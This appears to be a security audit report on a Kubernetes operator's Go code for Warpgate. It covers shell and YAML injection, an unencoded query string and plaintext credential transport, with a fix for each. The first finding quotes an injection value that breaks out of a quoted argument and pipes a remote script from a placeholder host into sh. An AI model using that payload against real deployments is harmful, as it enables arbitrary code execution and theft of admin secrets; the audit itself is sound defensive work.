summary: Reviewed the warpgate-operator Go codebase (a Kubernetes operator for Warpgate) in scope internal/, cmd/, and api/. The operator reconciles custom resources into Deployments/Secrets and talks to the Warpgate admin REST API. Overall the code handles Kubernetes Secrets carefully (no secret values are logged, passwords are generated with crypto/rand) and most API bodies are passed as structured JSON. The main risks are injection flaws arising from user-controlled CR fields (spec.databaseURL, spec.externalHost) being interpolated into a shell script and into a generated YAML config without any validation/escaping, plus unencoded query-string construction in the API client. No findings were traced in test files, config/, charts/, or docs/, which were out of the reviewed code scope.

findings.title: Command injection via spec.databaseURL in WarpgateInstance init-container shell script
findings.description: buildDeployment assembles a /bin/sh init script by string concatenation and runs it via Command: ["/bin/sh", "-c", initScript] (line 776). The user-controlled field inst.Spec.DatabaseURL is interpolated directly into the setup command as `--database-url "%s"` with no escaping or validation. A WarpgateInstance author can set spec.databaseURL to something like `sqlite:/data/db"; curl http://evil/x | sh; echo "` to break out of the double-quoted argument and execute arbitrary shell commands inside the init container, which runs with the pod's service account and has the admin password mounted as $ADMIN_PASSWORD. The WarpgateInstance validating webhook (api/v1alpha1/warpgateinstance_webhook.go) only emits a warning for databaseURL and never validates its contents, and the CRD type (warpgateinstance_types.go:86) has no pattern constraint. Unlike spec.image, the CR does not otherwise expose container command/args, so this grants arbitrary code execution not otherwise available to a namespace-scoped user who can only create WarpgateInstance CRs.
findings.evidence: line 556-558: if inst.Spec.DatabaseURL != "" { setupCmd += fmt.Sprintf(` --database-url "%s"`, inst.Spec.DatabaseURL) }  ->  scriptParts append setupCmd (line 570)  ->  initScript := strings.Join(scriptParts, "\n") (611)  ->  Command: []string{"/bin/sh", "-c", initScript} (776). Source spec.DatabaseURL has no webhook/CRD validation (warpgateinstance_webhook.go:256-258 only adds a warning).
findings.recommendation: Do not build the setup command via shell string interpolation. Pass warpgate flags as discrete argv elements (Command/Args slice) instead of `/bin/sh -c`, or pass user-controlled values through environment variables referenced by the fixed script (as already done for ADMIN_PASSWORD). At minimum, validate spec.databaseURL against a strict allowlist/regex (scheme + no shell metacharacters/newlines) in the validating webhook.

findings.title: YAML config injection via spec.databaseURL / spec.externalHost in generated warpgate.yaml
findings.description: buildWarpgateConfig constructs the warpgate.yaml ConfigMap by printf-formatting user-controlled CR fields directly into the YAML document with no escaping. inst.Spec.DatabaseURL is written as `database_url: "%s"` (line 345) and inst.Spec.ExternalHost as `external_host: %s` (line 380). Because neither field is validated, a newline in the value lets a WarpgateInstance author inject arbitrary top-level YAML directives into the Warpgate configuration (e.g. redefining listeners, disabling TLS, or altering recording/parameters), which is then mounted and used by the Warpgate server. This is a second, distinct sink from the shell-injection finding and reaches a different artifact (the ConfigMap at internal/controller/warpgateinstance_controller.go:401-404).
findings.evidence: line 344-345: if inst.Spec.DatabaseURL != "" { fmt.Fprintf(&b, "database_url: \"%s\"\n", inst.Spec.DatabaseURL) }. Also line 379-381: fmt.Fprintf(&b, "external_host: %s\n", inst.Spec.ExternalHost). Both sources lack validation in warpgateinstance_webhook.go.
findings.recommendation: Serialize the config with a real YAML marshaller (e.g. sigs.k8s.io/yaml / gopkg.in/yaml.v3) so values are properly quoted/escaped, and validate externalHost/databaseURL (reject newlines and control characters) in the webhook.

findings.title: Unencoded search parameter in Warpgate API client ListUsers/ListTargets URL
findings.description: ListUsers builds the request path by concatenating the raw search string: path += "?search=" + search. The search value is the username taken from CR specs (e.g. GetUserByUsername is called with WarpgatePasswordCredential.Spec.Username). Because the value is not URL/query-encoded, a username containing '&', '#', spaces or other reserved characters alters the query sent to the Warpgate admin API (additional query parameters, truncation). The same pattern exists in internal/warpgate/target.go:208-209 (ListTargets). Impact is limited because callers re-filter results by exact name match and Go's net/http rejects control characters, but malformed/ambiguous requests to the admin API are possible.
findings.evidence: user.go:81-83: path := "/users"; if search != "" { path += "?search=" + search }. Source: WarpgatePasswordCredential.Spec.Username -> GetUserByUsername -> ListUsers(username). Mirror: target.go:208-209.
findings.recommendation: Construct the query with net/url: use url.Values{"search": {search}}.Encode() or url.QueryEscape(search) so reserved characters are percent-encoded.

findings.title: WarpgateConnection webhook permits plaintext http:// host for token/password auth
findings.description: validateConnection accepts any Host beginning with http:// or https://. When http:// is used, the client transmits the Warpgate API token in the X-Warpgate-Token header (internal/warpgate/client.go:152-154) and the username/password in a JSON login body (client.go:101-110) over an unencrypted channel, exposing them to network eavesdroppers. The operator's own auto-created connections use https (warpgateinstance_controller.go:1096), but a user-authored WarpgateConnection may point at an http:// endpoint and the webhook raises no error or warning.
findings.evidence: warpgateconnection_webhook.go:87-89 allows prefix http://; client.go:152-154 sets X-Warpgate-Token on every request regardless of scheme; client.go:101-110 posts username/password.
findings.recommendation: Require https:// (or at least emit an admission warning for http://), and/or refuse to send credentials over non-TLS connections in the client.
